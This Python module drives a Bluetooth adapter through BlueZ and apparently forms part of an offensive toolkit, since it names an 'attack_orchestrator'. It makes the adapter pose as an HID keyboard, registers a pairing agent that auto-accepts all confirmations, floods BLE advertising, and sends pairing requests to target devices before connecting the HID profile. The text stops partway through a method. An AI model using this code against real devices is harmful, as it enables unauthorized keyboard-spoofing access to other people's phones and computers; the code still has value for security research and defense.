"""
Bluetooth Manager — D-Bus interface to the system BlueZ Bluetooth adapter.

Provides adapter management (power, discoverable, pairable), device discovery,
and a foundation for profile registration and pairing operations used by
downstream modules (attack_orchestrator, TargetScanner, etc.).
"""

import dbus
import dbus.mainloop.glib
import dbus.service
import logging
import struct
import subprocess
from typing import Optional

logger = logging.getLogger(__name__)

# BlueZ D-Bus constants
BLUEZ_SERVICE = "org.bluez"
BLUEZ_ADAPTER_IFACE = "org.bluez.Adapter1"
BLUEZ_DEVICE_IFACE = "org.bluez.Device1"
BLUEZ_PROFILE_MANAGER_IFACE = "org.bluez.ProfileManager1"
BLUEZ_AGENT_MANAGER_IFACE = "org.bluez.AgentManager1"
DBUS_PROPERTIES_IFACE = "org.freedesktop.DBus.Properties"
DBUS_OBJECT_MANAGER_IFACE = "org.freedesktop.DBus.ObjectManager"

# HID Keyboard Service UUID (Bluetooth SIG assigned)
HID_KEYBOARD_UUID = "00001124-0000-1000-8000-00805f9b34fb"

# BLE Advertising interval unit: 0.625ms
# HCI LE command group (OGF 0x08)
HCI_OGF_LE = 0x08
# LE Set Advertising Parameters (OCF 0x0006)
HCI_OCF_LE_SET_ADV_PARAMS = 0x0006
# LE Set Advertise Enable (OCF 0x000A)
HCI_OCF_LE_SET_ADV_ENABLE = 0x000A
# BLE advertising interval unit in milliseconds
BLE_ADV_INTERVAL_UNIT_MS = 0.625
# Minimum BLE advertising interval allowed by spec (20ms = 32 units)
BLE_ADV_INTERVAL_MIN_MS = 20
# Default rapid advertising interval in ms
DEFAULT_RAPID_ADV_INTERVAL_MS = 20
# Advertising types
ADV_TYPE_IND = 0x00  # Connectable undirected
ADV_TYPE_DIRECT_IND_HIGH = 0x01  # Connectable directed (high duty)
ADV_TYPE_SCAN_IND = 0x02  # Scannable undirected
ADV_TYPE_NONCONN_IND = 0x03  # Non-connectable undirected
# Own address types
OWN_ADDR_PUBLIC = 0x00
OWN_ADDR_RANDOM = 0x01
# Channel map: all three advertising channels (37, 38, 39)
ADV_CHANNEL_ALL = 0x07
# Filter policy: allow scan/connect from any device
ADV_FILTER_ALLOW_ALL = 0x00

# ── Just Works SSP (Secure Simple Pairing) Constants ──────────────────
# IO Capability "NoInputNoOutput" forces the "Just Works" association model,
# which triggers an immediate pairing pop-up on the target device without
# requiring numeric comparison or passkey entry on either side.
AGENT_CAPABILITY_NO_INPUT_NO_OUTPUT = "NoInputNoOutput"
AGENT_PATH_JUST_WORKS = "/org/bluez/agent_just_works"
# Default passkey returned when the stack unexpectedly requests one
JUST_WORKS_DEFAULT_PASSKEY = dbus.UInt32(0)

# Bluetooth Class of Device (CoD) — Peripheral/Keyboard
# 0x000540 = Major: Peripheral (0x05), Minor: Keyboard (0x40)
DEVICE_CLASS_PERIPHERAL_KEYBOARD = 0x000540
DEVICE_CLASS_MAJOR_PERIPHERAL = 0x05
DEVICE_CLASS_MINOR_KEYBOARD = 0x40

# SDP record XML for broadcasting as a Peripheral/Keyboard device.
# Declares HID service UUID 0x1124, L2CAP + HIDP protocol stack,
# and HIDDeviceSubclass 0x40 (Keyboard) matching CoD 0x000540.
KEYBOARD_SDP_RECORD_XML = """<?xml version="1.0" encoding="UTF-8" ?>
<record>
  <!-- ServiceClassIDList: HID UUID -->
  <attribute id="0x0001">
    <sequence>
      <uuid value="0x1124" />
    </sequence>
  </attribute>
  <!-- ProtocolDescriptorList: L2CAP (PSM 0x0011) + HIDP -->
  <attribute id="0x0004">
    <sequence>
      <sequence>
        <uuid value="0x0100" />
        <uint16 value="0x0011" />
      </sequence>
      <sequence>
        <uuid value="0x0011" />
      </sequence>
    </sequence>
  </attribute>
  <!-- BrowseGroupList: PublicBrowseRoot -->
  <attribute id="0x0005">
    <sequence>
      <uuid value="0x1002" />
    </sequence>
  </attribute>
  <!-- LanguageBaseAttributeIDList -->
  <attribute id="0x0006">
    <sequence>
      <uint16 value="0x656e" />
      <uint16 value="0x006a" />
      <uint16 value="0x0100" />
    </sequence>
  </attribute>
  <!-- BluetoothProfileDescriptorList: HID v1.0 -->
  <attribute id="0x0009">
    <sequence>
      <sequence>
        <uuid value="0x1124" />
        <uint16 value="0x0100" />
      </sequence>
    </sequence>
  </attribute>
  <!-- AdditionalProtocolDescriptorLists: L2CAP (PSM 0x0013) + HIDP -->
  <attribute id="0x000d">
    <sequence>
      <sequence>
        <sequence>
          <uuid value="0x0100" />
          <uint16 value="0x0013" />
        </sequence>
        <sequence>
          <uuid value="0x0011" />
        </sequence>
      </sequence>
    </sequence>
  </attribute>
  <!-- ServiceName -->
  <attribute id="0x0100">
    <text value="Bluetooth Keyboard" />
  </attribute>
  <!-- ServiceDescription -->
  <attribute id="0x0101">
    <text value="Bluetooth HID Keyboard" />
  </attribute>
  <!-- ProviderName -->
  <attribute id="0x0102">
    <text value="SMS Gateway" />
  </attribute>
  <!-- HIDParserVersion -->
  <attribute id="0x0201">
    <uint16 value="0x0111" />
  </attribute>
  <!-- HIDDeviceSubclass: 0x40 = Keyboard (matches CoD minor class) -->
  <attribute id="0x0202">
    <uint8 value="0x40" />
  </attribute>
  <!-- HIDCountryCode: 0x00 = Not localized -->
  <attribute id="0x0203">
    <uint8 value="0x00" />
  </attribute>
  <!-- HIDVirtualCable -->
  <attribute id="0x0204">
    <boolean value="true" />
  </attribute>
  <!-- HIDReconnectInitiate -->
  <attribute id="0x0205">
    <boolean value="true" />
  </attribute>
  <!-- HIDDescriptorList: standard keyboard HID descriptor -->
  <attribute id="0x0206">
    <sequence>
      <sequence>
        <uint8 value="0x22" />
        <text encoding="hex" value="05010906a101850175019508050719e029e715002501810295017508810395057501050819012905910295017503910395067508150025650507190029658100c0" />
      </sequence>
    </sequence>
  </attribute>
  <!-- HIDLANGIDBaseList -->
  <attribute id="0x0207">
    <sequence>
      <sequence>
        <uint16 value="0x0409" />
        <uint16 value="0x0100" />
      </sequence>
    </sequence>
  </attribute>
  <!-- HIDBootDevice: true (supports boot protocol) -->
  <attribute id="0x020e">
    <boolean value="true" />
  </attribute>
</record>
"""


class JustWorksAgent(dbus.service.Object):
    """
    BlueZ Agent1 implementing "Just Works" pairing (NoInputNoOutput IO capability).

    When registered with BlueZ's AgentManager, this agent:
    - Claims NoInputNoOutput IO capability, forcing SSP "Just Works" mode
    - Auto-accepts all pairing confirmations and authorization requests
    - Returns a zero passkey if the stack unexpectedly requests one
    - Causes target devices (iOS, Android, etc.) to show an immediate
      simple pairing pop-up without numeric comparison

    This is a D-Bus service object that BlueZ calls back into during pairing.
    """

    AGENT_INTERFACE = "org.bluez.Agent1"

    def __init__(self, bus, path=AGENT_PATH_JUST_WORKS):
        """
        Initialize the Just Works agent on the given D-Bus bus.

        Args:
            bus: D-Bus system bus instance.
            path: D-Bus object path for this agent.
        """
        self._path = path
        dbus.service.Object.__init__(self, bus, path)
        logger.info("JustWorksAgent created at %s", path)

    @property
    def path(self) -> str:
        """Return the D-Bus object path of this agent."""
        return self._path

    @dbus.service.method(AGENT_INTERFACE, in_signature="", out_signature="")
    def Release(self):
        """Called when the agent is unregistered."""
        logger.info("JustWorksAgent released")

    @dbus.service.method(AGENT_INTERFACE, in_signature="o", out_signature="s")
    def RequestPinCode(self, device):
        """Return an empty PIN code (not used in SSP, but required by interface)."""
        logger.info("JustWorksAgent: RequestPinCode for %s → empty", device)
        return ""

    @dbus.service.method(AGENT_INTERFACE, in_signature="os", out_signature="")
    def DisplayPinCode(self, device, pincode):
        """Display PIN code (no-op for NoInputNoOutput)."""
        logger.info("JustWorksAgent: DisplayPinCode %s for %s (ignored)", pincode, device)

    @dbus.service.method(AGENT_INTERFACE, in_signature="o", out_signature="u")
    def RequestPasskey(self, device):
        """Return zero passkey — auto-accept for Just Works."""
        logger.info("JustWorksAgent: RequestPasskey for %s → 0", device)
        return JUST_WORKS_DEFAULT_PASSKEY

    @dbus.service.method(AGENT_INTERFACE, in_signature="ouq", out_signature="")
    def DisplayPasskey(self, device, passkey, entered):
        """Display passkey (no-op for NoInputNoOutput)."""
        logger.info(
            "JustWorksAgent: DisplayPasskey %06d (entered %d) for %s (ignored)",
            passkey, entered, device,
        )

    @dbus.service.method(AGENT_INTERFACE, in_signature="ou", out_signature="")
    def RequestConfirmation(self, device, passkey):
        """Auto-accept numeric confirmation — core of Just Works behavior."""
        logger.info(
            "JustWorksAgent: RequestConfirmation %06d for %s → auto-accepted",
            passkey, device,
        )

    @dbus.service.method(AGENT_INTERFACE, in_signature="o", out_signature="")
    def RequestAuthorization(self, device):
        """Auto-authorize the device — allows pairing without user interaction."""
        logger.info("JustWorksAgent: RequestAuthorization for %s → auto-authorized", device)

    @dbus.service.method(AGENT_INTERFACE, in_signature="os", out_signature="")
    def AuthorizeService(self, device, uuid):
        """Auto-authorize service access (e.g., HID profile)."""
        logger.info("JustWorksAgent: AuthorizeService %s for %s → authorized", uuid, device)

    @dbus.service.method(AGENT_INTERFACE, in_signature="", out_signature="")
    def Cancel(self):
        """Called when a pairing operation is cancelled."""
        logger.info("JustWorksAgent: pairing cancelled by remote")


class BluetoothManager:
    """Manages the system Bluetooth adapter via D-Bus/BlueZ."""

    def __init__(self, adapter_name: str = "hci0"):
        """
        Initialize the Bluetooth manager.

        Args:
            adapter_name: Name of the Bluetooth adapter (default: hci0).
        """
        self._adapter_name = adapter_name
        self._adapter_path = f"/org/bluez/{adapter_name}"
        self._bus: Optional[dbus.SystemBus] = None
        self._adapter: Optional[dbus.Interface] = None
        self._adapter_props: Optional[dbus.Interface] = None
        self._profile_manager: Optional[dbus.Interface] = None
        self._just_works_agent: Optional[JustWorksAgent] = None

        self._init_dbus()

    def _init_dbus(self) -> None:
        """Initialize D-Bus connection and adapter interfaces."""
        dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
        self._bus = dbus.SystemBus()

        try:
            adapter_obj = self._bus.get_object(BLUEZ_SERVICE, self._adapter_path)
            self._adapter = dbus.Interface(adapter_obj, BLUEZ_ADAPTER_IFACE)
            self._adapter_props = dbus.Interface(adapter_obj, DBUS_PROPERTIES_IFACE)
            logger.info("Connected to BlueZ adapter at %s", self._adapter_path)
        except dbus.exceptions.DBusException as e:
            logger.error("Failed to connect to adapter %s: %s", self._adapter_name, e)
            raise

    @property
    def bus(self) -> dbus.SystemBus:
        """Return the D-Bus system bus."""
        return self._bus

    @property
    def adapter_path(self) -> str:
        """Return the D-Bus object path of the adapter."""
        return self._adapter_path

    # ── Adapter Properties ─────────────────────────────────────────────

    def get_adapter_property(self, prop: str):
        """Get a single property from the adapter."""
        return self._adapter_props.Get(BLUEZ_ADAPTER_IFACE, prop)

    def set_adapter_property(self, prop: str, value) -> None:
        """Set a single property on the adapter."""
        self._adapter_props.Set(BLUEZ_ADAPTER_IFACE, prop, value)

    @property
    def address(self) -> str:
        """Return the adapter's Bluetooth MAC address."""
        return str(self.get_adapter_property("Address"))

    @property
    def name(self) -> str:
        """Return the adapter's friendly name."""
        return str(self.get_adapter_property("Name"))

    @property
    def powered(self) -> bool:
        """Return whether the adapter is powered on."""
        return bool(self.get_adapter_property("Powered"))

    @powered.setter
    def powered(self, value: bool) -> None:
        """Power the adapter on or off."""
        self.set_adapter_property("Powered", dbus.Boolean(value))
        logger.info("Adapter %s powered %s", self._adapter_name, "on" if value else "off")

    @property
    def discoverable(self) -> bool:
        """Return whether the adapter is discoverable."""
        return bool(self.get_adapter_property("Discoverable"))

    @discoverable.setter
    def discoverable(self, value: bool) -> None:
        """Set the adapter discoverable state."""
        self.set_adapter_property("Discoverable", dbus.Boolean(value))
        logger.info("Adapter %s discoverable: %s", self._adapter_name, value)

    @property
    def pairable(self) -> bool:
        """Return whether the adapter is pairable."""
        return bool(self.get_adapter_property("Pairable"))

    @pairable.setter
    def pairable(self, value: bool) -> None:
        """Set the adapter pairable state."""
        self.set_adapter_property("Pairable", dbus.Boolean(value))
        logger.info("Adapter %s pairable: %s", self._adapter_name, value)

    @property
    def alias(self) -> str:
        """Return the adapter's advertised alias (friendly name)."""
        return str(self.get_adapter_property("Alias"))

    @alias.setter
    def alias(self, value: str) -> None:
        """Set the adapter's advertised alias."""
        self.set_adapter_property("Alias", dbus.String(value))
        logger.info("Adapter alias set to '%s'", value)

    @property
    def discoverable_timeout(self) -> int:
        """Return the discoverable timeout in seconds (0 = infinite)."""
        return int(self.get_adapter_property("DiscoverableTimeout"))

    @discoverable_timeout.setter
    def discoverable_timeout(self, seconds: int) -> None:
        """Set the discoverable timeout. 0 means stay discoverable indefinitely."""
        self.set_adapter_property("DiscoverableTimeout", dbus.UInt32(seconds))

    # ── Device Discovery ───────────────────────────────────────────────

    def start_discovery(self) -> None:
        """Start scanning for nearby Bluetooth devices."""
        self._adapter.StartDiscovery()
        logger.info("Discovery started on %s", self._adapter_name)

    def stop_discovery(self) -> None:
        """Stop scanning for nearby Bluetooth devices."""
        try:
            self._adapter.StopDiscovery()
            logger.info("Discovery stopped on %s", self._adapter_name)
        except dbus.exceptions.DBusException:
            pass  # Not discovering — safe to ignore

    def get_discovered_devices(self) -> list[dict]:
        """
        Return a list of discovered Bluetooth devices.

        Each device is a dict with keys: address, name, paired, connected, rssi.
        """
        obj_manager = dbus.Interface(
            self._bus.get_object(BLUEZ_SERVICE, "/"),
            DBUS_OBJECT_MANAGER_IFACE,
        )
        managed_objects = obj_manager.GetManagedObjects()

        devices = []
        for path, interfaces in managed_objects.items():
            if BLUEZ_DEVICE_IFACE not in interfaces:
                continue
            if not str(path).startswith(self._adapter_path):
                continue

            props = interfaces[BLUEZ_DEVICE_IFACE]
            devices.append({
                "path": str(path),
                "address": str(props.get("Address", "")),
                "name": str(props.get("Name", props.get("Alias", "Unknown"))),
                "paired": bool(props.get("Paired", False)),
                "connected": bool(props.get("Connected", False)),
                "rssi": int(props.get("RSSI", 0)),
                "uuids": [str(u) for u in props.get("UUIDs", [])],
                "manufacturer_data": dict(props.get("ManufacturerData", {})),
            })

        return devices

    def remove_device(self, device_path: str) -> None:
        """Remove a cached device from the adapter."""
        self._adapter.RemoveDevice(dbus.ObjectPath(device_path))
        logger.info("Removed device %s", device_path)

    # ── Profile Manager ────────────────────────────────────────────────

    def get_profile_manager(self) -> dbus.Interface:
        """Return the BlueZ ProfileManager1 interface for registering profiles."""
        if self._profile_manager is None:
            obj = self._bus.get_object(BLUEZ_SERVICE, "/org/bluez")
            self._profile_manager = dbus.Interface(obj, BLUEZ_PROFILE_MANAGER_IFACE)
        return self._profile_manager

    def register_profile(self, profile_path: str, uuid: str, options: dict) -> None:
        """
        Register a Bluetooth profile with BlueZ.

        Args:
            profile_path: D-Bus object path for the profile.
            uuid: Service UUID string.
            options: Profile options dict (Name, Role, Channel, etc.).
        """
        manager = self.get_profile_manager()
        manager.RegisterProfile(
            dbus.ObjectPath(profile_path),
            uuid,
            dbus.Dictionary(options, signature="sv"),
        )
        logger.info("Registered profile %s (UUID: %s)", profile_path, uuid)

    def unregister_profile(self, profile_path: str) -> None:
        """Unregister a previously registered Bluetooth profile."""
        manager = self.get_profile_manager()
        manager.UnregisterProfile(dbus.ObjectPath(profile_path))
        logger.info("Unregistered profile %s", profile_path)

    # ── Agent Manager ──────────────────────────────────────────────────

    def get_agent_manager(self) -> dbus.Interface:
        """Return the BlueZ AgentManager1 interface for pairing agents."""
        obj = self._bus.get_object(BLUEZ_SERVICE, "/org/bluez")
        return dbus.Interface(obj, BLUEZ_AGENT_MANAGER_IFACE)

    # ── Just Works Pairing Agent ──────────────────────────────────────

    def register_just_works_agent(
        self,
        agent_path: str = AGENT_PATH_JUST_WORKS,
    ) -> JustWorksAgent:
        """
        Register a "Just Works" pairing agent with BlueZ.

        Creates a JustWorksAgent (NoInputNoOutput IO capability) and registers
        it as the default pairing agent. This forces the Bluetooth SSP "Just Works"
        association model, which:
        - Skips numeric comparison on both sides
        - Auto-accepts all pairing confirmations on our side
        - Causes target devices to show an immediate simple pairing pop-up

        Args:
            agent_path: D-Bus object path for the agent.

        Returns:
            The registered JustWorksAgent instance.

        Raises:
            dbus.exceptions.DBusException: If agent registration fails.
        """
        # Unregister existing agent if any
        if self._just_works_agent is not None:
            self.unregister_just_works_agent()

        # Create and register the agent
        self._just_works_agent = JustWorksAgent(self._bus, agent_path)
        agent_manager = self.get_agent_manager()
        agent_manager.RegisterAgent(
            dbus.ObjectPath(agent_path),
            AGENT_CAPABILITY_NO_INPUT_NO_OUTPUT,
        )
        agent_manager.RequestDefaultAgent(dbus.ObjectPath(agent_path))

        logger.info(
            "Just Works agent registered at %s (capability: %s)",
            agent_path,
            AGENT_CAPABILITY_NO_INPUT_NO_OUTPUT,
        )
        return self._just_works_agent

    def unregister_just_works_agent(
        self,
        agent_path: str = AGENT_PATH_JUST_WORKS,
    ) -> None:
        """
        Unregister the Just Works pairing agent from BlueZ.

        Args:
            agent_path: D-Bus object path of the agent to unregister.
        """
        try:
            agent_manager = self.get_agent_manager()
            agent_manager.UnregisterAgent(dbus.ObjectPath(agent_path))
            logger.info("Just Works agent unregistered from %s", agent_path)
        except dbus.exceptions.DBusException as e:
            logger.warning("Failed to unregister Just Works agent: %s", e)

        self._just_works_agent = None

    @property
    def just_works_agent(self) -> Optional[JustWorksAgent]:
        """Return the currently registered Just Works agent, or None."""
        return self._just_works_agent

    @property
    def just_works_enabled(self) -> bool:
        """Return whether the Just Works pairing agent is currently registered."""
        return self._just_works_agent is not None

    def configure_just_works_pairing(
        self,
        agent_path: str = AGENT_PATH_JUST_WORKS,
    ) -> dict:
        """
        Full setup for Just Works pairing: enable adapter, register agent,
        and configure the adapter as pairable with no timeout.

        This is the high-level convenience method that prepares the adapter
        for triggering immediate pairing pop-ups on target devices.

        Args:
            agent_path: D-Bus object path for the agent.

        Returns:
            Dict with configuration status details.
        """
        # Ensure adapter is powered, discoverable, and pairable
        self.ensure_ready()

        # Register the Just Works agent
        agent = self.register_just_works_agent(agent_path)

        logger.info("Just Works pairing fully configured on %s", self._adapter_name)
        return {
            "adapter": self._adapter_name,
            "agent_path": agent.path,
            "capability": AGENT_CAPABILITY_NO_INPUT_NO_OUTPUT,
            "just_works_enabled": True,
            "pairable": True,
            "discoverable": True,
        }

    # ── Low-Level HCI Utilities ────────────────────────────────────────

    @staticmethod
    def hci_set_device_class(adapter: str, major: int, minor: int) -> None:
        """
        Set the Bluetooth device class via hcitool.

        Args:
            adapter: Adapter name (e.g., "hci0").
            major: Major device class byte.
            minor: Minor device class byte.
        """
        class_hex = f"0x{(major << 8 | minor):06x}"
        subprocess.run(
            ["hcitool", "-i", adapter, "class", class_hex],
            check=True,
            capture_output=True,
        )
        logger.info("Set device class to %s on %s", class_hex, adapter)

    @staticmethod
    def hci_reset_adapter(adapter: str = "hci0") -> None:
        """Reset the Bluetooth adapter via hciconfig."""
        subprocess.run(["hciconfig", adapter, "reset"], check=True, capture_output=True)
        logger.info("Reset adapter %s", adapter)

    # ── BLE Rapid Advertising ─────────────────────────────────────────

    @staticmethod
    def _ms_to_adv_interval(ms: float) -> int:
        """
        Convert milliseconds to BLE advertising interval units (0.625ms each).

        Args:
            ms: Interval in milliseconds (minimum 20ms per BLE spec).

        Returns:
            Interval value in 0.625ms units.

        Raises:
            ValueError: If interval is below the BLE minimum (20ms).
        """
        if ms < BLE_ADV_INTERVAL_MIN_MS:
            raise ValueError(
                f"Advertising interval {ms}ms is below BLE minimum "
                f"({BLE_ADV_INTERVAL_MIN_MS}ms)"
            )
        return int(ms / BLE_ADV_INTERVAL_UNIT_MS)

    @staticmethod
    def _build_adv_params_args(
        interval_min: int,
        interval_max: int,
        adv_type: int = ADV_TYPE_IND,
        own_addr_type: int = OWN_ADDR_PUBLIC,
        peer_addr_type: int = 0x00,
        peer_addr: bytes = b"\x00" * 6,
        channel_map: int = ADV_CHANNEL_ALL,
        filter_policy: int = ADV_FILTER_ALLOW_ALL,
    ) -> list[str]:
        """
        Build the hex byte arguments for LE Set Advertising Parameters.

        The HCI command (OGF 0x08, OCF 0x0006) expects 15 bytes:
          - Advertising_Interval_Min: 2 bytes LE
          - Advertising_Interval_Max: 2 bytes LE
          - Advertising_Type: 1 byte
          - Own_Address_Type: 1 byte
          - Peer_Address_Type: 1 byte
          - Peer_Address: 6 bytes
          - Advertising_Channel_Map: 1 byte
          - Advertising_Filter_Policy: 1 byte

        Returns:
            List of hex byte strings for hcitool cmd.
        """
        params = struct.pack(
            "<HHBBb6sBB",
            interval_min,
            interval_max,
            adv_type,
            own_addr_type,
            peer_addr_type,
            peer_addr,
            channel_map,
            filter_policy,
        )
        return [f"0x{b:02x}" for b in params]

    def start_rapid_advertising(
        self,
        interval_min_ms: float = DEFAULT_RAPID_ADV_INTERVAL_MS,
        interval_max_ms: float = DEFAULT_RAPID_ADV_INTERVAL_MS,
        adv_type: int = ADV_TYPE_IND,
        own_addr_type: int = OWN_ADDR_PUBLIC,
        adapter: Optional[str] = None,
    ) -> dict:
        """
        Start BLE advertising with high-frequency intervals.

        Uses hcitool to send raw HCI LE commands:
        1. LE Set Advertising Parameters (OCF 0x0006) — sets min/max interval
        2. LE Set Advertise Enable (OCF 0x000A) — enables advertising

        Args:
            interval_min_ms: Minimum advertising interval in ms (default 20ms).
            interval_max_ms: Maximum advertising interval in ms (default 20ms).
            adv_type: BLE advertising type (default: ADV_IND connectable).
            own_addr_type: Own address type (0x00=public, 0x01=random).
            adapter: Adapter name override (default: instance adapter).

        Returns:
            Dict with advertising configuration details.

        Raises:
            ValueError: If interval is below BLE minimum (20ms).
            subprocess.CalledProcessError: If hcitool command fails.
        """
        adapter = adapter or self._adapter_name

        # Convert ms to BLE interval units (0.625ms each)
        interval_min = self._ms_to_adv_interval(interval_min_ms)
        interval_max = self._ms_to_adv_interval(interval_max_ms)

        if interval_max < interval_min:
            raise ValueError(
                f"interval_max ({interval_max_ms}ms) must be >= "
                f"interval_min ({interval_min_ms}ms)"
            )

        logger.info(
            "Setting rapid advertising on %s: interval %d-%d units (%.1f-%.1fms)",
            adapter,
            interval_min,
            interval_max,
            interval_min_ms,
            interval_max_ms,
        )

        # Build advertising parameters
        param_args = self._build_adv_params_args(
            interval_min=interval_min,
            interval_max=interval_max,
            adv_type=adv_type,
            own_addr_type=own_addr_type,
        )

        # Send LE Set Advertising Parameters via hcitool
        adv_params_cmd = [
            "hcitool", "-i", adapter, "cmd",
            f"0x{HCI_OGF_LE:02x}",
            f"0x{HCI_OCF_LE_SET_ADV_PARAMS:04x}",
        ] + param_args

        subprocess.run(adv_params_cmd, check=True, capture_output=True)
        logger.info("LE Set Advertising Parameters sent on %s", adapter)

        # Send LE Set Advertise Enable (0x01 = enable)
        adv_enable_cmd = [
            "hcitool", "-i", adapter, "cmd",
            f"0x{HCI_OGF_LE:02x}",
            f"0x{HCI_OCF_LE_SET_ADV_ENABLE:04x}",
            "0x01",
        ]

        subprocess.run(adv_enable_cmd, check=True, capture_output=True)
        logger.info("BLE advertising enabled on %s", adapter)

        return {
            "adapter": adapter,
            "interval_min_ms": interval_min_ms,
            "interval_max_ms": interval_max_ms,
            "interval_min_units": interval_min,
            "interval_max_units": interval_max,
            "adv_type": adv_type,
            "own_addr_type": own_addr_type,
            "enabled": True,
        }

    def stop_rapid_advertising(self, adapter: Optional[str] = None) -> None:
        """
        Stop BLE advertising on the adapter.

        Sends LE Set Advertise Enable with enable=0x00 to disable advertising.

        Args:
            adapter: Adapter name override (default: instance adapter).

        Raises:
            subprocess.CalledProcessError: If hcitool command fails.
        """
        adapter = adapter or self._adapter_name

        adv_disable_cmd = [
            "hcitool", "-i", adapter, "cmd",
            f"0x{HCI_OGF_LE:02x}",
            f"0x{HCI_OCF_LE_SET_ADV_ENABLE:04x}",
            "0x00",
        ]

        subprocess.run(adv_disable_cmd, check=True, capture_output=True)
        logger.info("BLE advertising disabled on %s", adapter)

    # ── Adapter Info ───────────────────────────────────────────────────

    def get_adapter_info(self) -> dict:
        """Return a summary of the adapter's current state."""
        return {
            "name": self.name,
            "address": self.address,
            "powered": self.powered,
            "discoverable": self.discoverable,
            "pairable": self.pairable,
            "alias": self.alias,
            "adapter": self._adapter_name,
        }

    def ensure_ready(self) -> None:
        """Ensure the adapter is powered on, discoverable, and pairable."""
        if not self.powered:
            self.powered = True
        if not self.discoverable:
            self.discoverable_timeout = 0
            self.discoverable = True
        if not self.pairable:
            self.pairable = True
        logger.info("Adapter %s is ready: %s", self._adapter_name, self.get_adapter_info())

    # ── SDP / Device Class Configuration ──────────────────────────────

    def configure_keyboard_sdp(self, profile_path: str = "/org/bluez/sdp_keyboard") -> None:
        """
        Configure the SDP record and device class to broadcast as a
        Peripheral/Keyboard (CoD 0x000540).

        This sets the HCI device class to Peripheral/Keyboard and registers
        an SDP service record advertising HID keyboard capabilities with
        BlueZ's ProfileManager.

        Args:
            profile_path: D-Bus object path for the SDP profile registration.
        """
        # Set HCI device class to Peripheral/Keyboard (0x000540)
        self.hci_set_device_class(
            self._adapter_name,
            DEVICE_CLASS_MAJOR_PERIPHERAL,
            DEVICE_CLASS_MINOR_KEYBOARD,
        )
        logger.info(
            "Device class set to Peripheral/Keyboard (0x%06x) on %s",
            DEVICE_CLASS_PERIPHERAL_KEYBOARD,
            self._adapter_name,
        )

        # Register the keyboard SDP record with BlueZ
        sdp_options = {
            "ServiceRecord": dbus.String(KEYBOARD_SDP_RECORD_XML),
            "Role": dbus.String("server"),
            "RequireAuthentication": dbus.Boolean(False),
            "RequireAuthorization": dbus.Boolean(False),
        }
        self.register_profile(
            profile_path,
            "00001124-0000-1000-8000-00805f9b34fb",  # HID UUID
            sdp_options,
        )
        logger.info(
            "Keyboard SDP record registered at %s (CoD: 0x%06x)",
            profile_path,
            DEVICE_CLASS_PERIPHERAL_KEYBOARD,
        )

    # ── Device Interface Helpers ─────────────────────────────────────

    def _address_to_device_path(self, address: str) -> str:
        """
        Convert a Bluetooth MAC address to a BlueZ D-Bus device object path.

        Args:
            address: Bluetooth address in XX:XX:XX:XX:XX:XX format.

        Returns:
            D-Bus object path (e.g., /org/bluez/hci0/dev_AA_BB_CC_DD_EE_FF).
        """
        addr_underscored = address.replace(":", "_").upper()
        return f"{self._adapter_path}/dev_{addr_underscored}"

    def get_device_interface(self, address: str) -> dbus.Interface:
        """
        Get the org.bluez.Device1 D-Bus interface for a device by address.

        Args:
            address: Bluetooth address in XX:XX:XX:XX:XX:XX format.

        Returns:
            D-Bus Interface for org.bluez.Device1.

        Raises:
            dbus.exceptions.DBusException: If the device is not known to BlueZ.
        """
        path = self._address_to_device_path(address)
        obj = self._bus.get_object(BLUEZ_SERVICE, path)
        return dbus.Interface(obj, BLUEZ_DEVICE_IFACE)

    def get_device_properties_interface(self, address: str) -> dbus.Interface:
        """
        Get the D-Bus Properties interface for a device by address.

        Args:
            address: Bluetooth address in XX:XX:XX:XX:XX:XX format.

        Returns:
            D-Bus Interface for org.freedesktop.DBus.Properties.
        """
        path = self._address_to_device_path(address)
        obj = self._bus.get_object(BLUEZ_SERVICE, path)
        return dbus.Interface(obj, DBUS_PROPERTIES_IFACE)

    def set_device_trusted(self, address: str, trusted: bool = True) -> None:
        """
        Set the Trusted property on a Bluetooth device.

        Trusted devices bypass interactive authorization prompts on our side,
        allowing pairing to proceed without local confirmation.

        Args:
            address: Bluetooth address in XX:XX:XX:XX:XX:XX format.
            trusted: Whether to trust (True) or untrust (False) the device.
        """
        props = self.get_device_properties_interface(address)
        props.Set(BLUEZ_DEVICE_IFACE, "Trusted", dbus.Boolean(trusted))
        logger.info("Device %s trusted: %s", address, trusted)

    # ── Pairing / Connection ──────────────────────────────────────────

    def trigger_pairing_request(
        self,
        address: str,
        set_trusted: bool = True,
    ) -> dict:
        """
        Initiate an outbound HID pairing request to a discovered peer address.

        Sends a Bluetooth pairing request to the target device, which triggers
        a pairing prompt/pop-up on the target. The adapter should be configured
        as a HID keyboard (via configure_keyboard_sdp) before calling this.

        Steps performed:
        1. Get the Device1 D-Bus interface for the target address.
        2. Mark the device as trusted (bypasses our local auth dialog).
        3. Call Pair() to initiate the pairing handshake.
        4. On successful pairing, attempt ConnectProfile() with HID UUID.

        Args:
            address: Target device Bluetooth address (XX:XX:XX:XX:XX:XX).
            set_trusted: Whether to mark the device as trusted before pairing.

        Returns:
            Dict with keys: address, device_path, status, paired, connected, error.
            Status is one of: "connected", "paired", "failed".
        """
        device_path = self._address_to_device_path(address)
        result = {
            "address": address,
            "device_path": device_path,
            "status": "failed",
            "paired": False,
            "connected": False,
            "error": None,
        }

        try:
            device = self.get_device_interface(address)
        except dbus.exceptions.DBusException as e:
            result["error"] = f"Device not found: {e}"
            logger.warning("Device %s not found in BlueZ object tree: %s", address, e)
            return result

        # Mark device as trusted to bypass local auth prompts
        if set_trusted:
            try:
                self.set_device_trusted(address, True)
            except dbus.exceptions.DBusException as e:
                logger.warning("Could not set trusted for %s: %s", address, e)

        # Initiate pairing — this sends the pairing request to the target
        try:
            logger.info("Sending pairing request to %s", address)
            device.Pair()
            result["paired"] = True
            result["status"] = "paired"
            logger.info("Pairing accepted by %s", address)
        except dbus.exceptions.DBusException as e:
            error_name = e.get_dbus_name() if hasattr(e, "get_dbus_name") else type(e).__name__
            error_msg = str(e)
            # AlreadyExists means already paired — treat as success
            if "AlreadyExists" in str(error_name):
                result["paired"] = True
                result["status"] = "paired"
                logger.info("Device %s already paired", address)
            else:
                result["error"] = f"{error_name}: {error_msg}"
                logger.warning("Pairing request to %s failed: %s", address, error_msg)
                return result

        # Attempt HID profile connection after successful pairing
        try:
            device.ConnectProfile(HID_KEYBOARD_UUID)
            result["connected"] = True
            result["status"] = "connected"
            logger.info("HID profile connected to %s", address)
        except dbus.exceptions.DBusException as e:
            logger.warning(
                "HID profile connection to %s failed (pairing still succeeded): %s",
                address,
                e,
            )

        return result

    def trigger_pairing_requests(
        self,
